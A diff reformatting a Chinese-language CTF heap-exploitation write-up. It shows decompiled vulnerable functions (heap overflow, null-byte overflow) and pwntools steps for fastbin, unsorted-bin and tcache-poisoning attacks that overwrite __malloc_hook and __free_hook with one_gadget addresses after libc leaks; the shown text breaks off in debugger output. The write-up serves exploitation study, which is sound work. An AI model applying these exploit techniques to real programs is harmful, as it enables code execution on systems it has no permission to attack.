@@ -17,763 +17,124 @@
 #### 申请内存allocate
 
 
-```
-
-void
-
-__fastcall
-
-allocate
-(
-node
-
-*
-a1
-)
-
+```python
+void __fastcall allocate(node *a1)
 {
-
-
-int
-
-i
-;
-
-// [rsp+10h] [rbp-10h]
-
-
-int
-
-v2
-;
-
-// [rsp+14h] [rbp-Ch]
-
-
-void
-
-*
-v3
-;
-
-// [rsp+18h] [rbp-8h]
-
-
-for
-
-(
-
-i
-
-=
-
-0
-;
-
-i
-
-<=
-
-15
-;
-
-++
-i
-
-)
-
-
-{
-
-
-if
-
-(
-
-!
-a1
-[
-i
-].
-used
-
-)
-
-
-{
-
-
-printf
-(
-"Size: "
-);
-
-
-v2
-
-=
-
-my_read
-();
-
-
-if
-
-(
-
-v2
-
->
-
-0
-
-)
-
-
-{
-
-
-if
-
-(
-
-v2
-
->
-
-4096
-
-)
-
-
-v2
-
-=
-
-4096
-;
-
-//最多分配1kb内存
-
-
-v3
-
-=
-
-calloc
-(
-v2
-,
-
-1uLL
-);
-
-// 分配出来的都是 0
-
-
-if
-
-(
-
-!
-v3
-
-)
-
-
-exit
-(
--1
-);
-
-
-a1
-[
-i
-].
-used
-
-=
-
-1
-;
-
-
-a1
-[
-i
-].
-size
-
-=
-
-v2
-;
-
-
-a1
-[
-i
-].
-addr
-
-=
-
-v3
-;
-
-
-printf
-(
-"Allocate Index %d
-\n
-"
-,
-
-i
-);
-
-
+  int i; // [rsp+10h] [rbp-10h]
+  int v2; // [rsp+14h] [rbp-Ch]
+  void *v3; // [rsp+18h] [rbp-8h]
+
+  for ( i = 0; i <= 15; ++i )
+  {
+    if ( !a1[i].used )
+    {
+      printf("Size: ");
+      v2 = my_read();
+      if ( v2 > 0 )
+      {
+        if ( v2 > 4096 )
+          v2 = 4096;    //最多分配1kb内存
+        v3 = calloc(v2, 1uLL);                  // 分配出来的都是 0 
+        if ( !v3 )
+          exit(-1);
+        a1[i].used = 1;
+        a1[i].size = v2;
+        a1[i].addr = v3;
+        printf("Allocate Index %d\n", i);
+      }
+      return;
+    }
+  }
 }
-
-
-return
-;
-
-
-}
-
-
-}
-
-}
-
 ```
 
 
 #### 添加内容fill
 
 
-```
-
-__int64
-
-__fastcall
-
-fill
-(
-node
-
-*
-a1
-)
-
+```python
+__int64 __fastcall fill(node *a1)
 {
-
-
-__int64
-
-result
-;
-
-// rax
-
-
-int
-
-v2
-;
-
-// [rsp+18h] [rbp-8h]
-
-
-int
-
-v3
-;
-
-// [rsp+1Ch] [rbp-4h]
-
-
-printf
-(
-"Index: "
-);
-
-
-result
-
-=
-
-my_read
-();
-
-// 自行指定长度，存在严重漏洞,可以溢出
-
-
-v2
-
-=
-
-result
-;
-
-
-if
-
-(
-
-result
-
-<
-
-0x10
-
-)
-
-
-{
-
-
-result
-
-=
-
-a1
-[
-result
-].
-used
-;
-
-
-if
-
-(
-
-result
-
-==
-
-1
-
-)
-
-
-{
-
-
-printf
-(
-"Size: "
-);
-
-
-result
-
-=
-
-my_read
-();
-
-
-v3
-
-=
-
-result
-;
-
-
-if
-
-(
-
-result
-
->
-
-0
-
-)
-
-
-{
-
-
-printf
-(
-"Content: "
-);
-
-
-return
-
-sub_11B2
-(
-a1
-[
-v2
-].
-addr
-,
-
-v3
-);
-
-
+  __int64 result; // rax
+  int v2; // [rsp+18h] [rbp-8h]
+  int v3; // [rsp+1Ch] [rbp-4h]
+
+  printf("Index: ");
+  result = my_read();          // 自行指定长度，存在严重漏洞,可以溢出
+  v2 = result;
+  if ( result < 0x10 )
+  {
+    result = a1[result].used;
+    if ( result == 1 )
+    {
+      printf("Size: ");
+      result = my_read();
+      v3 = result;
+      if ( result > 0 )
+      {
+        printf("Content: ");
+        return sub_11B2(a1[v2].addr, v3);
+      }
+    }
+  }
+  return result;
 }
-
-
-}
-
-
-}
-
-
-return
-
-result
-;
-
-}
-
 ```
 
 
 #### 释放内存free
 
 
-```
-
-__int64
-
-__fastcall
-
-free_0
-(
-node
-
-*
-a1
-)
-
+```python
+__int64 __fastcall free_0(node *a1)
 {
+  __int64 result; // rax
+  int v2; // [rsp+1Ch] [rbp-4h]
 
-
-__int64
-
-result
-;
-
-// rax
-
-
-int
-
-v2
-;
-
-// [rsp+1Ch] [rbp-4h]
-
-
-printf
-(
-"Index: "
-);
-
-
-result
-
-=
-
-my_read
-();
-
-
-v2
-
-=
-
-result
-;
-
-
-if
-
-(
-
-result
-
-<
-
-0x10
-
-)
-
-
-{
-
-
-result
-
-=
-
-a1
-[
-result
-].
-used
-;
-
-
-if
-
-(
-
-result
-
-==
-
-1
-
-)
-
-
-{
-
-
-a1
-[
-v2
-].
-used
-
-=
-
-0
-;
-
-
-a1
-[
-v2
-].
-size
-
-=
-
-0L
-L
-;
-
-
-free
-(
-a1
-[
-v2
-].
-addr
-);
-
-
-result
-
-=
-
-&
-a1
-[
-v2
-];
-
-
-*
-(
-result
-
-+
-
-16
-)
-
-=
-
-0L
-L
-;
-//没有ua可以用
-
-
+  printf("Index: ");
+  result = my_read();
+  v2 = result;
+  if ( result < 0x10 )
+  {
+    result = a1[result].used;
+    if ( result == 1 )
+    {
+      a1[v2].used = 0;
+      a1[v2].size = 0LL;
+      free(a1[v2].addr);
+      result = &a1[v2];
+      *(result + 16) = 0LL;//没有ua可以用
+    }
+  }
+  return result;
 }
-
-
-}
-
-
-return
-
-result
-;
-
-}
-
 ```
 
 
 #### 打印内容dump
 
 
-```
-
-unsigned
-
-int
-
-__fastcall
-
-dunp
-(
-node
-
-*
-a1
-)
-
+```python
+unsigned int __fastcall dunp(node *a1)
 {
+  unsigned int result; // eax
+  unsigned int v2; // [rsp+1Ch] [rbp-4h]
 
-
-unsigned
-
-int
-
-result
-;
-
-// eax
-
-
-unsigned
-
-int
-
-v2
-;
-
-// [rsp+1Ch] [rbp-4h]
-
-
-printf
-(
-"Index: "
-);
-
-
-result
-
-=
-
-my_read
-();
-
-
-v2
-
-=
-
-result
-;
-
-
-if
-
-(
-
-result
-
-<
-
-0x10
-
-)
-
-
-{
-
-
-result
-
-=
-
-a1
-[
-result
-].
-used
-;
-
-
-if
-
-(
-
-result
-
-==
-
-1
-
-)
-
-
-{
-
-
-puts
-(
-"Content: "
-);
-
-
-sub_130F
-(
-a1
-[
-v2
-].
-addr
-,
-
-a1
-[
-v2
-].
-size
-);
-
-
-return
-
-puts
-(
-byte_14F1
-);
-
-
+  printf("Index: ");
+  result = my_read();
+  v2 = result;
+  if ( result < 0x10 )
+  {
+    result = a1[result].used;
+    if ( result == 1 )
+    {
+      puts("Content: ");
+      sub_130F(a1[v2].addr, a1[v2].size);
+      return puts(byte_14F1);
+    }
+  }
+  return result;
 }
-
-
-}
-
-
-return
-
-result
-;
-
-}
-
 ```
 
 
@@ -788,47 +149,11 @@ result
 
 
 ```
-
-allo
-(
-0x10
-)
-
-
-# idx=0,addr=0
-
-allo
-(
-0x10
-)
-
-
-# idx=1,addr=0x20
-
-allo
-(
-0x10
-)
-
-
-# idx=2,addr=0x40
-
-allo
-(
-0x10
-)
-
-
-# idx=3,addr=0x60
-
-allo
-(
-0x80
-)
-
-
-# idx=4,addr=0x80
-
+allo(0x10)    # idx=0,addr=0
+allo(0x10)    # idx=1,addr=0x20
+allo(0x10)    # idx=2,addr=0x40
+allo(0x10)    # idx=3,addr=0x60
+allo(0x80)    # idx=4,addr=0x80
 ```
 
 申请4个0x10大小的内存(带上前缀内容，总计0x80字节大小)，申请后如下
@@ -839,41 +164,9 @@ allo
 
 
 ```
-
-free
-(
-2
-)
-
-free
-(
-1
-)
-
-payload
-
-=
-
-b
-'a'
-*
-0x10
-+
-p64
-(
-0
-)
-+
-p64
-(
-0x21
-)
-+
-p8
-(
-0x80
-)
-
+free(2)
+free(1)
+payload = b'a'*0x10+p64(0)+p64(0x21)+p8(0x80)
 ```
 
 ![Pasted image 20250824131607.png](../../images/Pasted%20image%2020250824131607.png)![Pasted image 20250824131824.png](../../images/Pasted%20image%2020250824131824.png)
@@ -884,47 +177,10 @@ p8
 
 
 ```
-
-payload
-
-=
-
-b
-'a'
-*
-0x10
-+
-p64
-(
-0
-)
-+
-p64
-(
-0x21
-)
-
-fill
-(
-3
-,
-payload
-)
-
-allo
-(
-0x10
-)
-
-##idx=1'
-
-allo
-(
-0x10
-)
-
-##idx=2'
-
+payload = b'a'*0x10+p64(0)+p64(0x21)
+fill(3,payload)
+allo(0x10)    ##idx=1'
+allo(0x10)    ##idx=2'
 ```
 
 效果如下：
@@ -937,48 +193,11 @@ allo
 
 
 ```
-
-payload
-
-=
-
-b
-'a'
-*
-0x10
-+
-p64
-(
-0
-)
-+
-p64
-(
-0x91
-)
-
-fill
-(
-3
-,
-payload
-)
-
-allo
-(
-0x80
-)
-
-free
-(
-4
-)
-
-dump
-(
-2
-)
-
+payload = b'a'*0x10+p64(0)+p64(0x91)
+fill(3,payload)
+allo(0x80)
+free(4)
+dump(2)
 ```
 
 ![Pasted image 20250824133314.png](../../images/Pasted%20image%2020250824133314.png)
@@ -991,51 +210,10 @@ dump
 
 
 ```
-
-p
-.
-recvuntil
-(
-b
-'Content:
-\n
-'
-)
-
-leak_addr
-
-=
-
-u64
-(
-p
-.
-recv
-(
-8
-))
-
-libc_base
-
-=
-
-leak_addr
-
--
-
-0x3c4b78
-
-log
-.
-success
-(
-"libc_base:"
-+
-hex
-(
-libc_base
-))
-
+p.recvuntil(b'Content: \n')
+leak_addr = u64(p.recv(8))
+libc_base = leak_addr - 0x3c4b78
+log.success("libc_base:"+hex(libc_base))
 ```
 
 
@@ -1051,51 +229,10 @@ malloc\_hook处偏移，fake\_chunk地址计算可得
 
 
 ```
-
-allo
-(
-0x60
-)
-
-
-# 重新申请chunk_4,大小符合条件
-
-free
-(
-4
-)
-
-
-# 释放到fastbin中，这样可以写fd为fake_chunk的地址
-
-payload
-
-=
-
-b
-'a'
-*
-0x13
-+
-p64
-(
-libc_base
-+
-0x3c4b20
--
-0x33
-)
-
-fill
-(
-2
-,
-payload
-)
-
-
-# 2指的就是4
-
+allo(0x60)   # 重新申请chunk_4,大小符合条件
+free(4)      # 释放到fastbin中，这样可以写fd为fake_chunk的地址
+payload = b'a'*0x13+p64(libc_base+0x3c4b20-0x33)
+fill(2,payload)    # 2指的就是4
 ```
 
 ![Pasted image 20250824135246.png](../../images/Pasted%20image%2020250824135246.png)
@@ -1104,46 +241,10 @@ fastbin中有一个在heap区的地址，还有一个在fake\_chunk的地址，�
 
 
 ```
-
-allo
-(
-0x60
-)
-
-
-# idx=4
-
-allo
-(
-0x60
-)
-
-
-# idx=6
-
-payload
-
-=
-
-b
-'a'
-*
-0x13
-+
-p64
-(
-ogg
-+
-libc_base
-)
-
-fill
-(
-6
-,
-payload
-)
-
+allo(0x60)   # idx=4
+allo(0x60)   # idx=6
+payload = b'a'*0x13+p64(ogg+libc_base)
+fill(6,payload)
 ```
 
 ![Pasted image 20250824140358.png](../../images/Pasted%20image%2020250824140358.png)
@@ -1180,45 +281,10 @@ v3=4869且magic大于4869的时候可以得到flag
 
 
 ```
-
-create
-(
-0x20
-,
-b
-'data'
-)
-
-
-# idx=0
-
-create
-(
-0x80
-,
-b
-'data'
-)
-
-
-# idx=1
-
-create
-(
-0x20
-,
-b
-'data'
-)
-
-
-# idx=2
-
-delete
-(
-1
-)
-
+create(0x20,b'data')    # idx=0
+create(0x80,b'data')    # idx=1
+create(0x20,b'data')    # idx=2
+delete(1)
 ```
 
 这里创建chunk2是为了防止ub释放后被合并到top\_chunk中
@@ -1232,65 +298,11 @@ delete
 
 
 ```
-
-magic
-
-=
-
-0x6020c0
-
-bk
-
-=
-
-magic
-
--
-
-0x10
-
-fd
-
-=
-
-0
-
-payload
-
-=
-
-b
-'a'
-*
-0x20
-+
-p64
-(
-0
-)
-+
-p64
-(
-0x91
-)
-+
-p64
-(
-fd
-)
-+
-p64
-(
-bk
-)
-
-edit
-(
-0
-,
-payload
-)
-
+magic = 0x6020c0
+bk = magic - 0x10
+fd = 0
+payload = b'a'*0x20+p64(0)+p64(0x91)+p64(fd)+p64(bk)
+edit(0,payload)
 ```
 
 ![Pasted image 20250824230717.png](../../images/Pasted%20image%2020250824230717.png)
@@ -1300,15 +312,7 @@ payload
 
 
 ```
-
-create
-(
-0x80
-,
-b
-'data'
-)
-
+create(0x80,b'data')
 ```
 
 ![Pasted image 20250824231109.png](../../images/Pasted%20image%2020250824231109.png)
@@ -1338,212 +342,33 @@ b
 但在`safe_read`中可以发现存在一个null\_byte\_overflow漏洞,如下
 
 
-```
-
-char
-
-*
-__fastcall
-
-safe_read
-(
-char
-
-*
-a1
-,
-
-int
-
-a2
-)
-
+```c
+char *__fastcall safe_read(char *a1, int a2)
 {
+  char *result; // rax
+  unsigned int v3; // [rsp+1Ch] [rbp-4h]
 
-
-char
-
-*
-result
-;
-
-// rax
-
-
-unsigned
-
-int
-
-v3
-;
-
-// [rsp+1Ch] [rbp-4h]
-
-
-v3
-
-=
-
-0
-;
-
-
-if
-
-(
-
-a2
-
-)
-
-
-{
-
-
-while
-
-(
-
-1
-
-)
-
-
-{
-
-
-read
-(
-0
-,
-
-&
-a1
-[
-v3
-],
-
-1uLL
-);
-
-
-if
-
-(
-
-a2
-
--
-
-1
-
-<
-
-v3
-
-||
-
-!
-a1
-[
-v3
-]
-
-||
-
-a1
-[
-v3
-]
-
-==
-
-10
-
-)
-
-
-break
-;
-
-
-++
-v3
-;
-
-
+  v3 = 0;
+  if ( a2 )
+  {
+    while ( 1 )
+    {
+      read(0, &a1[v3], 1uLL);
+      if ( a2 - 1 < v3 || !a1[v3] || a1[v3] == 10 )
+        break;
+      ++v3;
+    }
+    a1[v3] = 0;
+    result = &a1[a2];
+    *result = 0;                                // 如果a1的容量为a2，会多写一字节0
+  }
+  else
+  {
+    result = a1;
+    *a1 = 0;
+  }
+  return result;
 }
-
-
-a1
-[
-v3
-]
-
-=
-
-0
-;
-
-
-result
-
-=
-
-&
-a1
-[
-a2
-];
-
-
-*
-result
-
-=
-
-0
-;
-
-// 如果a1的容量为a2，会多写一字节0
-
-
-}
-
-
-else
-
-
-{
-
-
-result
-
-=
-
-a1
-;
-
-
-*
-a1
-
-=
-
-0
-;
-
-
-}
-
-
-return
-
-result
-;
-
-}
-
 ```
 
 
@@ -1585,128 +410,29 @@ null\_byte\_overflow漏洞的利用方法是通过溢出覆盖`prev_in_use`字�
 由于存在tcache，而我们需要ub结构，所以先填满tcache
 
 
-```
+```python
+for i in range(7):
+    new(0x10,'{}'.format(i).encode()+b' - tcache')
+for i in range(3):
+    new(0x10,'{}'.format(i+7).encode()+b' - ub')
 
-for
-
-i
-
-in
-
-range
-(
-7
-):
-
-
-new
-(
-0x10
-,
-'
-{}
-'
-.
-format
-(
-i
-)
-.
-encode
-()
-+
-b
-' - tcache'
-)
-
-for
-
-i
-
-in
-
-range
-(
-3
-):
-
-
-new
-(
-0x10
-,
-'
-{}
-'
-.
-format
-(
-i
-+
-7
-)
-.
-encode
-()
-+
-b
-' - ub'
-)
-
-for
-
-i
-
-in
-
-range
-(
-6
-):
-
-
-dele
-(
-i
-)
-
-dele
-(
-9
-)
-
-for
-
-i
-
-in
-
-range
-(
-6
-,
-9
-):
-
-
-deke
-(
-i
-)
-
+for i in range(6):
+    dele(i)
+dele(9)
+for i in range(6,9):
+    deke(i)
 ```
 
 这里在$idx_5$和$idx_7$之间先释放一个$idx_9$，防止top chunk将ub块合并，然后我们得到的chunk布局如下：
 
 
 ```
-
 +-----+
 |     | <-- tcache perthread 结构体
 +-----+
 | ... | <-- 6 个 tcache 块,idx=0~5
 +-----+
-|  A  | <-- idx=6 ----|
+|  A  | <-- idx=6 ----|    
 +-----+               |
 |  B  | <-- idx=7 ----|-- 3 个 unsorted bin 块
 +-----+               |
@@ -1716,7 +442,6 @@ i
 +-----+
 | top |
 |  .. |
-
 ```
 
 
@@ -1725,183 +450,79 @@ i
 从tcache中申请空，然后再从ub中申请
 
 
-```
-
-for
-
-i
-
-in
-
-range
-(
-7
-):
-
-
-new
-(
-0x10
-,
-'
-{}
-'
-.
-format
-(
-i
-+
-7
-)
-.
-encode
-()
-+
-b
-'-tcache'
-)
-
-new
-(
-0x10
-,
-b
-'7 - A'
-)
-
-new
-(
-0x10
-,
-b
-'8 - B'
-)
-
-new
-(
-0x10
-,
-b
-'9 - C'
-)
-
+```python
+for i in range(7):
+    new(0x10,'{}'.format(i+7).encode()+b'-tcache')
+new(0x10,b'7 - A')
+new(0x10,b'8 - B')
+new(0x10,b'9 - C')
 ```
 
 此时的chunk布局
 
 
 ```
-
 +-----+
 |     | <-- tcache perthread 结构体
 +-----+
 | ... | <-- idx=0~5
 +-----+
-|  A  | <-- idx=7
-+-----+
-|  B  | <-- idx=8
-+-----+
-|  C  | <-- idx=9
+|  A  | <-- idx=7   
++-----+               
+|  B  | <-- idx=8 
++-----+              
+|  C  | <-- idx=9 
 +-----+
 |     | <-- idx=6
 +-----+
 | top |
 |  .. |
-
 ```
 
 然后将B写入tcache，A写入ub来获取fd和kb
 
 
-```
-
-for
-
-i
-
-in
-
-range
-(
-6
-):
-
-
-dele
-(
-i
-)
-
-dele
-(
-8
-)
-
-dele
-(
-7
-)
-
+```python
+for i in range(6):
+    dele(i)
+dele(8)
+dele(7)
 ```
 
 此时的chunk布局
 
 
 ```
-
 +-----+
 |     | <-- tcache perthread 结构体
 +-----+
 | ... | <-- idx=0~5   tcache
 +-----+
-|  A  | <-- idx=7     ub
-+-----+
+|  A  | <-- idx=7     ub   
++-----+               
 |  B  | <-- idx=8     tcache
-+-----+
-|  C  | <-- idx=9
++-----+               
+|  C  | <-- idx=9 
 +-----+
 |     | <-- idx=6
 +-----+
 | top |
 |  .. |
-
 ```
 
 由于B位于tcache的第一位，所以直接申请就是B,进行NULL字节溢出
 
 
 ```
-
-new
-(
-0xf8
-,
-
-b
-'0 - overflow'
-)
-
-dele
-(
-6
-)
-
-#释放防止合并的tcache
-
-dele
-(
-9
-)
-
-#合并
-
+new(0xf8, b'0 - overflow')
+dele(6)    #释放防止合并的tcache
+dele(9)    #合并
 ```
 
 此时chunk布局
 
 
 ```
-
 +-----+
 |     | <-- tcache perthread 结构体
 +-----+
@@ -1917,7 +538,6 @@ dele
 +-----+
 | top |
 |  .. |
-
 ```
 
 
@@ -1926,120 +546,28 @@ dele
 将A从大free块中分配出来，就可以将libc内容落到B中，打印B就可以了
 
 
-```
-
-for
-
-i
-
-in
-
-range
-(
-7
-):
-
-
-new
-(
-0x10
-,
-'
-{}
-'
-.
-format
-(
-i
-)
-.
-encode
-()
-+
-b
-' - tcache'
-)
-
-new
-(
-0x10
-,
-
-b
-'8 - fillup'
-)
-
-dump
-(
-0
-)
-
-leak_libc
-
-=
-
-u64
-(
-rl
-()
-.
-strip
-()
-.
-ljust
-(
-8
-,
-b
-'
-\x00
-'
-))
-
-log
-.
-success
-(
-"leak_libc:"
-+
-hex
-(
-leak_libc
-))
-
-libc_base
-
-=
-
-leak_libc
--
-0x3ebca0
-
-log
-.
-success
-(
-"libc_base:"
-+
-hex
-(
-libc_base
-))
-
+```python
+for i in range(7):
+    new(0x10,'{}'.format(i).encode()+b' - tcache')
+new(0x10, b'8 - fillup')
+dump(0)
+leak_libc = u64(rl().strip().ljust(8,b'\x00'))
+log.success("leak_libc:"+hex(leak_libc))
+libc_base = leak_libc-0x3ebca0
+log.success("libc_base:"+hex(libc_base))
 ```
 
 此时的chunk布局
 
 
 ```
-
 +-----+
 |     | <-- tcache perthread 结构体
 +-----+
-| ... | <-- idx=1~6
+| ... | <-- idx=1~6   
 +-----+
 |  A  | <-- idx=7     实际idx=8
-+-----+
++-----+                            
 |  B  | <-- idx=8     实际idx=0----+
 +-----+                            |----大free块
 |  C  | <-- idx=9     ub-----------+
@@ -2048,7 +576,6 @@ libc_base
 +-----+
 | top |
 |  .. |
-
 ```
 
 
@@ -2058,129 +585,49 @@ libc_base
 
 
 ```
-
-new
-(
-0x10
-,
-b
-'9 - next'
-)
-
+new(0x10,b'9 - next')
 ```
 
 chunk布局
 
 
 ```
-
 +-----+
 |     | <-- tcache perthread 结构体
 +-----+
-| ... | <-- idx=1~6
+| ... | <-- idx=1~6   
 +-----+
 |  A  | <-- idx=7     实际idx=8
-+-----+
++-----+                            
 |  B  | <-- idx=8     实际idx=0，idx=9
-+-----+
++-----+ 
 |  C  | <-- idx=9     ub
 +-----+
 |     | <-- idx=7     tcache
 +-----+
 | top |
 |  .. |
-
 ```
 
 我们先删一个到tcache里面，这样打uaf的时候可以利用，防止tcache空了就不认了
 
 
 ```
-
-dele
-(
-1
-)
-
-dele
-(
-0
-)
-
-dele
-(
-9
-)
-
+dele(1)
+dele(0)
+dele(9)
 ```
 
 打free\_hook
 
 
 ```
-
-new
-(
-0x10
-,
-p64
-(
-libc
-.
-sym
-[
-'__free_hook'
-]
-+
-libc_base
-))
-
-# idx=0的，实际idx=0,修改接下来申请地址
-
-new
-(
-0x10
-,
-b
-'a'
-)
-
-# idx=9的，实际idx=1，占掉一个,后面free这个
-
-ogg
-
-=
-
-libc_base
-+
-0x4f322
-
-log
-.
-success
-(
-"ogg:"
-+
-hex
-(
-ogg
-))
-
-new
-(
-0x10
-,
-p64
-(
-ogg
-))
-#实际idx=2
-
-dele
-(
-1
-)
-
+new(0x10,p64(libc.sym['__free_hook']+libc_base))# idx=0的，实际idx=0,修改接下来申请地址
+new(0x10,b'a')# idx=9的，实际idx=1，占掉一个,后面free这个
+ogg = libc_base+0x4f322
+log.success("ogg:"+hex(ogg))
+new(0x10,p64(ogg))#实际idx=2
+dele(1)
 ```
 
 
@@ -2204,595 +651,92 @@ dele
 #### 创建堆块
 
 
-```
-
-int
-
-new
-()
-
+```python
+int new()
 {
+  _QWORD *v0; // rax
+  int i; // [rsp+Ch] [rbp-14h]
+  _BYTE *v3; // [rsp+10h] [rbp-10h]
+  unsigned __int64 size; // [rsp+18h] [rbp-8h]
 
-
-_QWORD
-
-*
-v0
-;
-
-// rax
-
-
-int
-
-i
-;
-
-// [rsp+Ch] [rbp-14h]
-
-
-_BYTE
-
-*
-v3
-;
-
-// [rsp+10h] [rbp-10h]
-
-
-unsigned
-
-__int64
-
-size
-;
-
-// [rsp+18h] [rbp-8h]
-
-
-for
-
-(
-
-i
-
-=
-
-0
-;
-
-;
-
-++
-i
-
-)
-
-
-{
-
-
-if
-
-(
-
-i
-
->
-
-9
-
-)
-
-
-{
-
-
-LODWORD
-(
-v0
-)
-
-=
-
-puts
-(
-":("
-);
-
-
-return
-
-(
-int
-)
-v0
-;
-
-
+  for ( i = 0; ; ++i )
+  {
+    if ( i > 9 )
+    {
+      LODWORD(v0) = puts(":(");
+      return (int)v0;
+    }
+    if ( !Node[i] )
+      break;
+  }
+  printf("Size:");
+  size = my_read();
+  if ( size > 0x2000 )//大于0x2000时退出
+    exit(-2);
+  v3 = malloc(size);
+  if ( !v3 )
+    exit(-1);
+  printf("Data:");
+  sub_B88(v3, (unsigned int)size);
+  v3[size] = 0;
+  Node[i] = v3;
+  v0 = content;
+  content[i] = size;
+  return (int)v0;
 }
-
-
-if
-
-(
-
-!
-Node
-[
-i
-]
-
-)
-
-
-break
-;
-
-
-}
-
-
-printf
-(
-"Size:"
-);
-
-
-size
-
-=
-
-my_read
-();
-
-
-if
-
-(
-
-size
-
->
-
-0x2000
-
-)
-//大于0x2000时退出
-
-
-exit
-(
--2
-);
-
-
-v3
-
-=
-
-malloc
-(
-size
-);
-
-
-if
-
-(
-
-!
-v3
-
-)
-
-
-exit
-(
--1
-);
-
-
-printf
-(
-"Data:"
-);
-
-
-sub_B88
-(
-v3
-,
-
-(
-unsigned
-
-int
-)
-size
-);
-
-
-v3
-[
-size
-]
-
-=
-
-0
-;
-
-
-Node
-[
-i
-]
-
-=
-
-v3
-;
-
-
-v0
-
-=
-
-content
-;
-
-
-content
-[
-i
-]
-
-=
-
-size
-;
-
-
-return
-
-(
-int
-)
-v0
-;
-
-}
-
 ```
 
 `sub_B88函数`如下:
 
 
-```
-
+```asm
 /*
-
  *将读入的最后一个`\n`换为`0`,这就造成了字节溢出
-
  */
 
-_BYTE
-
-*
-__fastcall
-
-sub_B88
-(
-__int64
-
-a1
-,
-
-unsigned
-
-int
-
-a2
-)
-
+_BYTE *__fastcall sub_B88(__int64 a1, unsigned int a2)
 {
+  _BYTE *result; // rax
+  int chk; // [rsp+1Ch] [rbp-4h]
 
-
-_BYTE
-
-*
-result
-;
-
-// rax
-
-
-int
-
-chk
-;
-
-// [rsp+1Ch] [rbp-4h]
-
-
-chk
-
-=
-
-__read_chk
-(
-0L
-L
-,
-
-a1
-,
-
-a2
-,
-
-a2
-);
-
-
-if
-
-(
-
-chk
-
-<=
-
-0
-
-)
-
-
-{
-
-
-puts
-(
-"read error"
-);
-
-
-_exit
-(
-1
-);
-
-
+  chk = __read_chk(0LL, a1, a2, a2);
+  if ( chk <= 0 )
+  {
+    puts("read error");
+    _exit(1);
+  }
+  result = (_BYTE *)*(unsigned __int8 *)(chk - 1LL + a1);
+  if ( (_BYTE)result == 10 )
+  {
+    result = (_BYTE *)(chk - 1LL + a1);
+    *result = 0;                                // null byte overflow
+  }
+  return result;
 }
-
-
-result
-
-=
-
-(
-_BYTE
-
-*
-)
-*
-(
-unsigned
-
-__int8
-
-*
-)(
-chk
-
--
-
-1L
-L
-
-+
-
-a1
-);
-
-
-if
-
-(
-
-(
-_BYTE
-)
-result
-
-==
-
-10
-
-)
-
-
-{
-
-
-result
-
-=
-
-(
-_BYTE
-
-*
-)(
-chk
-
--
-
-1L
-L
-
-+
-
-a1
-);
-
-
-*
-result
-
-=
-
-0
-;
-
-// null byte overflow
-
-
-}
-
-
-return
-
-result
-;
-
-}
-
 ```
 
 
 #### 删除堆块
 
 
-```
-
-int
-
-delete
-()
-
+```python
+int delete()
 {
+  unsigned __int64 v1; // [rsp+8h] [rbp-8h]
 
-
-unsigned
-
-__int64
-
-v1
-;
-
-// [rsp+8h] [rbp-8h]
-
-
-printf
-(
-"Index:"
-);
-
-
-v1
-
-=
-
-my_read
-();
-
-
-if
-
-(
-
-v1
-
->
-
-9
-
-)
-
-
-exit
-(
--3
-);
-
-
-if
-
-(
-
-Node
-[
-v1
-]
-
-)
-
-
-{
-
-
-memset
-(
-Node
-[
-v1
-],
-
-0xDA
-,
-
-content
-[
-v1
-]);
-
-
-free
-(
-Node
-[
-v1
-]);
-
-
-Node
-[
-v1
-]
-
-=
-
-0L
-L
-;
-
-
-content
-[
-v1
-]
-
-=
-
-0L
-L
-;
-
-
+  printf("Index:");
+  v1 = my_read();
+  if ( v1 > 9 )
+    exit(-3);
+  if ( Node[v1] )
+  {
+    memset(Node[v1], 0xDA, content[v1]);
+    free(Node[v1]);
+    Node[v1] = 0LL;
+    content[v1] = 0LL;
+  }
+  return puts(":)");
 }
-
-
-return
-
-puts
-(
-":)"
-);
-
-}
-
 ```
 
 什么都做了，似乎没有漏洞
@@ -2816,74 +760,13 @@ puts
 
 
 ```
-
-new
-(
-0x500
--
-0x8
-,
-b
-'a'
-)
-#idx=0,size=0x500
-
-new
-(
-0x30
-,
-b
-'a'
-)
-#idx=1,size=0x40
-
-new
-(
-0x40
-,
-b
-'a'
-)
-#idx=2,size=0x50
-
-new
-(
-0x50
-,
-b
-'a'
-)
-#idx=3,size=0x60
-
-new
-(
-0x60
-,
-b
-'a'
-)
-#idx=4,size=0x70
-
-new
-(
-0x500
--
-0x8
-,
-b
-'a'
-)
-#idx=5,size=0x500
-
-new
-(
-0x70
-,
-b
-'a'
-)
-#idx=6,size=0x80
-
+new(0x500-0x8,b'a')#idx=0,size=0x500
+new(0x30,b'a')#idx=1,size=0x40
+new(0x40,b'a')#idx=2,size=0x50
+new(0x50,b'a')#idx=3,size=0x60
+new(0x60,b'a')#idx=4,size=0x70
+new(0x500-0x8,b'a')#idx=5,size=0x500
+new(0x70,b'a')#idx=6,size=0x80
 ```
 
 这里总共创建七个堆块，其中$idx_6$是为了防止和top\_chunk合并
@@ -2891,65 +774,18 @@ b
 
 
 ```
-
-dele
-(
-4
-)
-#通过4的溢出修改5
-
-new
-(
-0x68
-,
-b
-'a'
-*
-0x60
-+
-b
-'
-\x60\x06
-'
-)
-#因为size=0x70，所以会从idx4的原chunk中分配，接下来覆盖到idx5的size段就可以了
-
-dele
-(
-0
-)
-#释放时会检查第一个，所以第一个不要释放5号
-
-dele
-(
-5
-)
-#释放5，让堆管理器认为有一个0x660大小的chunk被释放,又因释放了0x500的另一个chunk，所以chunk合并为0xB60
-
-dele
-(
-2
-)
-#释放一个tcache，size=0x50
-
+dele(4)#通过4的溢出修改5
+new(0x68,b'a'*0x60+b'\x60\x06')#因为size=0x70，所以会从idx4的原chunk中分配，接下来覆盖到idx5的size段就可以了
+dele(0)#释放时会检查第一个，所以第一个不要释放5号
+dele(5)#释放5，让堆管理器认为有一个0x660大小的chunk被释放,又因释放了0x500的另一个chunk，所以chunk合并为0xB60
+dele(2)#释放一个tcache，size=0x50
 ```
 
 此时，idx0、2、5被释放，tcache中有一个0x50大小
 
 ```
-
-new
-(
-0x530
-)
-#idx=0,此时开始构造堆重叠，因为我们要把idx1也给覆盖进去，所以我们申请0x500+0x40-0x10=0x530大小,大chunk此时为0x620
-
-dele
-(
-4
-)
-#释放一个tcache,size=0x70
-
+new(0x530)#idx=0,此时开始构造堆重叠，因为我们要把idx1也给覆盖进去，所以我们申请0x500+0x40-0x10=0x530大小,大chunk此时为0x620
+dele(4)#释放一个tcache,size=0x70
 ```
 
 此时idx2、4、5被释放
@@ -2963,119 +799,31 @@ dele
 
 
 ```
-
-pwndbg>
-
-p
-
-&
-_IO_2_1_stdout_
-
-$1
-
-=
-
-(
-<data
-
-variable,
-
